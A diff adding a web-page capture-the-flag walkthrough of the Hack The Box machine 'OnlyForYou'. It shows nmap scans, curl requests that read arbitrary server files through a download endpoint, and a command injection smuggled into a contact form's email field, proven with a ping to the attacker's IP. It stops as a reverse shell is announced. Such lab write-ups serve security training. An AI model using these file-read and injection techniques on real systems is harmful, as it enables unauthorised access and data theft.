@@ -1,0 +1,460 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OnlyForYou - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/medium/only4you/img/only4you.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>OnlyForYou - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/OnlyForYou">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <!-- Aquí va el contenido del writeup -->
+                <div class="codehilite"><pre><span></span><code><span class="n">Machine</span><span class="o">:</span><span class="w"> </span><span class="n">OnlyForYou</span>
+<span class="n">Difficult</span><span class="o">:</span><span class="w"> </span><span class="n">Medium</span>
+<span class="n">Platform</span><span class="o">:</span><span class="w"> </span><span class="n">HackTheBox</span>
+<span class="n">Release</span><span class="o">:</span><span class="w"> </span><span class="n">Released</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mi">04</span><span class="sr">/22/</span><span class="mi">2023</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<h3><br/>Recon:</h3><br/>
+We begin with the reconnaissance phase, remembering that this is the most crucial part, as all the information we can gather initially may be useful later during the exploitation phase.<br/><br/>
+<h4>Port Scan</h4>
+Machines typically offer services, and these services are exposed through ports. Therefore, we need to determine which of these ports are open in order to start exploiting vulnerable services.<br/><br/>
+In this case, we use the <code>nmap</code> tool to scan all ports (65535)<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="nx">elswix</span><span class="err">@</span><span class="nx">parrot</span><span class="err">$</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">p</span><span class="o">-</span><span class="w"> </span><span class="o">--</span><span class="nx">open</span><span class="w"> </span><span class="o">-</span><span class="nx">sS</span><span class="w"> </span><span class="o">--</span><span class="nx">min</span><span class="o">-</span><span class="nx">rate</span><span class="w"> </span><span class="mi">5000</span><span class="w"> </span><span class="o">-</span><span class="nx">v</span><span class="w"> </span><span class="o">-</span><span class="nx">n</span><span class="w"> </span><span class="o">-</span><span class="nx">Pn</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">10</span><span class="w"> </span><span class="o">-</span><span class="nx">oN</span><span class="w"> </span><span class="nx">portScan</span>
+
+<span class="nx">Host</span><span class="w"> </span><span class="nx">discovery</span><span class="w"> </span><span class="nx">disabled</span><span class="w"> </span><span class="p">(</span><span class="o">-</span><span class="nx">Pn</span><span class="p">).</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">addresses</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">marked</span><span class="w"> </span><span class="err">'</span><span class="nx">up</span><span class="err">'</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">times</span><span class="w"> </span><span class="nx">may</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">slower</span><span class="p">.</span>
+<span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.9</span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2023-04-29 12:33 EDT</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">SYN</span><span class="w"> </span><span class="nx">Stealth</span><span class="w"> </span><span class="nx">Scan</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">12</span><span class="p">:</span><span class="mi">33</span>
+<span class="nx">Scanning</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">10</span><span class="w"> </span><span class="p">[</span><span class="mi">65535</span><span class="w"> </span><span class="nx">ports</span><span class="p">]</span>
+<span class="nx">Discovered</span><span class="w"> </span><span class="nx">open</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">10</span>
+<span class="nx">Discovered</span><span class="w"> </span><span class="nx">open</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">10</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">SYN</span><span class="w"> </span><span class="nx">Stealth</span><span class="w"> </span><span class="nx">Scan</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">12</span><span class="p">:</span><span class="mi">33</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">15.4</span><span class="mi">9</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span><span class="w"> </span><span class="p">(</span><span class="mi">65535</span><span class="w"> </span><span class="nx">total</span><span class="w"> </span><span class="nx">ports</span><span class="p">)</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">10</span>
+<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.1</span><span class="mi">5</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
+<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65533</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
+<span class="nx">PORT</span><span class="w">   </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span>
+
+<span class="nx">Read</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">from</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">nmap</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">15.6</span><span class="mi">5</span><span class="w"> </span><span class="nx">seconds</span>
+<span class="w">           </span><span class="nx">Raw</span><span class="w"> </span><span class="nx">packets</span><span class="w"> </span><span class="nx">sent</span><span class="p">:</span><span class="w"> </span><span class="mi">75845</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">3.3</span><span class="mi">37</span><span class="nx">MB</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">Rcvd</span><span class="p">:</span><span class="w"> </span><span class="mi">75825</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">3.0</span><span class="mi">33</span><span class="nx">MB</span><span class="p">)</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We can see that the scan has found two open ports (80 and 22). Now, we will proceed to perform a scan of the technologies and versions running on these ports.<br/><br/>
+Once again, we will use the <code>nmap</code> tool:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="nx">elswix</span><span class="err">@</span><span class="nx">parrot</span><span class="err">$</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sC</span><span class="w"> </span><span class="o">-</span><span class="nx">sV</span><span class="w"> </span><span class="o">-</span><span class="nx">p80</span><span class="p">,</span><span class="mi">22</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">10</span><span class="w"> </span><span class="o">-</span><span class="nx">oN</span><span class="w"> </span><span class="nx">fullScan</span>
+<span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.9</span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2023-04-29 12:35 EDT</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">10</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.10.11.2</span><span class="mi">10</span><span class="p">)</span>
+<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.1</span><span class="mi">6</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
+
+<span class="nx">PORT</span><span class="w">   </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span><span class="w">     </span><span class="nx">OpenSSH</span><span class="w"> </span><span class="m m-Double">8.2</span><span class="nx">p1</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="w"> </span><span class="mi">4</span><span class="nx">ubuntu0</span><span class="m m-Double">.5</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">protocol</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">3072</span><span class="w"> </span><span class="nx">e883e0a9fd43df38198aaa35438411ec</span><span class="w"> </span><span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
+<span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="mi">83</span><span class="nx">f235229b03860c16cfb3fa9f5acd08</span><span class="w"> </span><span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">445</span><span class="nx">f7aa377690a77789b04e09f11db80</span><span class="w"> </span><span class="p">(</span><span class="nx">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">    </span><span class="nx">nginx</span><span class="w"> </span><span class="m m-Double">1.18.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Did</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="nx">follow</span><span class="w"> </span><span class="nx">redirect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//only4you.htb/</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">nginx</span><span class="o">/</span><span class="m m-Double">1.18.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span>
+
+<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">20.4</span><span class="mi">9</span><span class="w"> </span><span class="nx">seconds</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<h3><br>Web Reconnaissance:</br></h3><br>
+After the scan, we can see that when accessing the website using the IP address, it redirects us to a domain: only4you.htb.<br/><br/>
+The issue is that during the redirection, our request does not know what that domain is. To avoid this problem, we will add the domain to the /etc/hosts file.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">Host</span><span class="w"> </span><span class="nx">addresses</span>
+<span class="m m-Double">127.0.0.1</span><span class="w">  </span><span class="nx">localhost</span>
+<span class="m m-Double">127.0.1.1</span><span class="w">  </span><span class="nx">Parrot</span>
+<span class="o">::</span><span class="mi">1</span><span class="w">        </span><span class="nx">localhost</span><span class="w"> </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">localhost</span><span class="w"> </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">loopback</span>
+<span class="nx">ff02</span><span class="o">::</span><span class="mi">1</span><span class="w">    </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">allnodes</span>
+<span class="nx">ff02</span><span class="o">::</span><span class="mi">2</span><span class="w">    </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">allrouters</span>
+
+<span class="m m-Double">10.10.11.2</span><span class="mi">10</span><span class="w"> </span><span class="nx">only4you</span><span class="p">.</span><span class="nx">htb</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+With this done, we will begin recognizing the technologies used by the website from the console, using the tool WhatWeb:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">whatweb</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">only4you</span><span class="p">.</span><span class="n">htb</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We don't see anything particularly interesting at the moment; we can only highlight an email address.<br/><br/>
+On the web front, we have the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/2.png"/><br/><br/>
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> shows us the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/3.png"/><br/><br/>
+There isn't anything interesting here either.<br/><br/>
+If we browse through the website a bit, there's a "Frequently Asked Questions" section in which there's one in particular that provides us with relevant information:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/4.png"/><br/><br/>
+The question "Are there some products available to check?" contains a hyperlink that leads us to a URL of a subdomain of the machine.<br/><br/>
+beta.only4you.htb<br/><br/>
+We add this domain to the /etc/hosts file.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">Host</span><span class="w"> </span><span class="nx">addresses</span>
+<span class="m m-Double">127.0.0.1</span><span class="w">  </span><span class="nx">localhost</span>
+<span class="m m-Double">127.0.1.1</span><span class="w">  </span><span class="nx">Parrot</span>
+<span class="o">::</span><span class="mi">1</span><span class="w">        </span><span class="nx">localhost</span><span class="w"> </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">localhost</span><span class="w"> </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">loopback</span>
+<span class="nx">ff02</span><span class="o">::</span><span class="mi">1</span><span class="w">    </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">allnodes</span>
+<span class="nx">ff02</span><span class="o">::</span><span class="mi">2</span><span class="w">    </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">allrouters</span>
+
+<span class="m m-Double">10.10.11.2</span><span class="mi">10</span><span class="w"> </span><span class="nx">only4you</span><span class="p">.</span><span class="nx">htb</span><span class="w"> </span><span class="nx">beta</span><span class="p">.</span><span class="nx">only4you</span><span class="p">.</span><span class="nx">htb</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+At first glance on the website, there's a button that allows us to download source code, which I believe belongs to the source code of the page on this subdomain.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/5.png"/><br/><br/>
+Once the file is downloaded, we can see that it's a zip file which contains the following files:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">beta</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">py</span>
+<span class="n">beta</span><span class="o">/</span><span class="k">static</span>
+<span class="n">beta</span><span class="o">/</span><span class="k">static</span><span class="o">/</span><span class="n">img</span>
+<span class="n">beta</span><span class="o">/</span><span class="k">static</span><span class="o">/</span><span class="n">img</span><span class="o">/</span><span class="n">image</span><span class="o">-</span><span class="n">resize</span><span class="o">.</span><span class="n">svg</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">templates</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="mf">400.</span><span class="n">html</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="mf">500.</span><span class="n">html</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="nb">convert</span><span class="o">.</span><span class="n">html</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">html</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="mf">405.</span><span class="n">html</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">list</span><span class="o">.</span><span class="n">html</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">resize</span><span class="o">.</span><span class="n">html</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="mf">404.</span><span class="n">html</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">uploads</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">resize</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">list</span>
+<span class="n">beta</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="nb">convert</span>
+<span class="n">beta</span><span class="o">/</span><span class="k">tool</span><span class="o">.</span><span class="n">py</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+It appears that we were correct, and it indeed belongs to the source code of the beta.only4you.htb page.<br/><br/>
+After analyzing the source code a bit, we can see that in the main.py file, there's a function that allows us to read files from the victim machine, indicating that it is vulnerable to Local File Inclusion (LFI).<br/><br/>
+Here's the <code>download</code> function from main.py:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/download'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
+    <span class="n">image</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'image'</span><span class="p">]</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="n">posixpath</span><span class="o">.</span><span class="n">normpath</span><span class="p">(</span><span class="n">image</span><span class="p">)</span> 
+    <span class="k">if</span> <span class="s1">'..'</span> <span class="ow">in</span> <span class="n">filename</span> <span class="ow">or</span> <span class="n">filename</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">'../'</span><span class="p">):</span>
+        <span class="n">flash</span><span class="p">(</span><span class="s1">'Hacking detected!'</span><span class="p">,</span> <span class="s1">'danger'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">'/list'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isabs</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+        <span class="n">filename</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'LIST_FOLDER'</span><span class="p">],</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+            <span class="n">flash</span><span class="p">(</span><span class="s1">'Image doesn</span><span class="se">\'</span><span class="s1">t exist!'</span><span class="p">,</span> <span class="s1">'danger'</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">'/list'</span><span class="p">)</span>
+    <span class="k">except</span> <span class="p">(</span><span class="ne">TypeError</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="n">BadRequest</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+The request we need to make should be a POST request, specifying a parameter called <code>image</code>:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/8.png"/><br/><br/>
+After conducting some tests, we can see that simply by providing the absolute path of the file we want to read, we can access it.<br/><br/>
+After a bit of research on the machine, I tried reading certain nginx configuration files to see what I could find. In this case, the file that revealed relevant information was:<br/><br/>
+<div class="codehilite"><pre><span></span><code>/etc/nginx/sites-available/default
+</code></pre><br style="line-height: 0.5;"/></div>
+
+In this case, it reveals certain information that we can use to our advantage:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/9.png"/><br/><br/>
+The pertinent information is the path where the main page is located, the one we had seen by accessing it with just the domain without specifying the subdomain:<br/><br/>
+<div class="codehilite"><pre><span></span><code>only4you.htb
+</code></pre><br style="line-height: 0.5;"/></div>
+
+The path we found is as follows:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+You might think about conducting fuzzing on this directory, but in my case, it wasn't necessary. I simply tried files that would likely exist in the directory, such as: app.py<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">py</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/10.png"/><br/><br/>
+This file caught my attention because it only contained information about the contact section of the main page, which is a form for supposedly sending a message:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/11.png"/><br/><br/>
+In this case, to analyze the code more thoroughly, I made a curl request to access the file:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="err">@</span><span class="n">parrot</span><span class="o">$</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">beta</span><span class="o">.</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">download</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s2">"image=/var/www/only4you.htb/app.py"</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Looking at the code, we can see that it calls a function named <code>sendmessage</code> from a supposed library called <code>form</code>.<br/><br/>
+The first thing that occurred to me was to check if that <code>form</code> library is located within the same directory:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="err">@</span><span class="n">parrot</span><span class="o">$</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">beta</span><span class="o">.</span><span class="n">only4you</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">download</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s2">"image=/var/www/only4you.htb/form.py"</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We can see that the output of the command returns the file form.py, the supposed library that contains the sendmessage function.<br/><br/>
+We can also see that when the issecure function is defined, it expects two parameters: email, which I assume is the email entered in the form on the main page, and ip, which probably represents the client making the request:<br/><br/>
+<div class="codehilite"><pre><span></span><code>def issecure(email, ip)
+</code></pre><br style="line-height: 0.5;"/></div>
+
+This parameter is processed using regular expressions to verify that it is legitimate and does not contain any malicious payloads.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="nv">not</span><span class="w"> </span><span class="nv">re</span>.<span class="nv">match</span><span class="ss">(</span><span class="s2">"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})"</span>,<span class="w"> </span><span class="nv">email</span><span class="ss">)</span>:
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Subsequently, there is processing of this parameter that extracts only the domain, or more precisely, the information that comes after the "@" symbol.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">email</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"@"</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Finally, with the "domain" variable, which stores the domain entered after the "@" symbol, it executes the "dig" command to make a DNS request.<br/><br/>
+<div class="codehilite"><pre><span></span><code>result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Everything seems fine, but the problem begins with the regular expression that checks the "email" parameter, as it does not verify the presence of <code>;</code> in the email, giving us the possibility to inject commands.<br/><br/>
+We should remember that to inject commands, we will need to place the <code>;</code> after the "@" symbol, as otherwise, it won't work because the variable used to execute the "dig" command stores only what comes after the "@" symbol in the "email" parameter.<br/><br/>
+The idea is as follows: we will intercept the request from the main page's form using Burp Suite and alter the content of the "email" parameter. We will attempt to send an ICMP trace (ping) from the victim machine to our machine:<br/><br/>
+Let's not forget to URL-encode our payload:<br/><br/>
+<div class="codehilite"><pre><span></span><code>ping -c 1 10.10.16.4
+</code></pre><br style="line-height: 0.5;"/></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/12.png"/><br/><br/>
+First, we put ourselves in listening mode from our machine using tcpdump:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">tcpdump</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">tun0</span><span class="w"> </span><span class="n">icmp</span><span class="w"> </span><span class="o">-</span><span class="n">n</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+And we send the request:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/only4you/img/14.png"/><br/><br/>
+As we can see, we have received the trace, and we have achieved remote command execution (RCE).<br/><br/>
+<h3><br>Shell as www-data</br></h3><br>
+With that done, now we will attempt to send a TCP Reverse Shell to our attacker machine. To do this, we will create an <code>index.html</code> file in which we will store a malicious payload written in bash that sends us a Reverse Shell.<br/><br/>
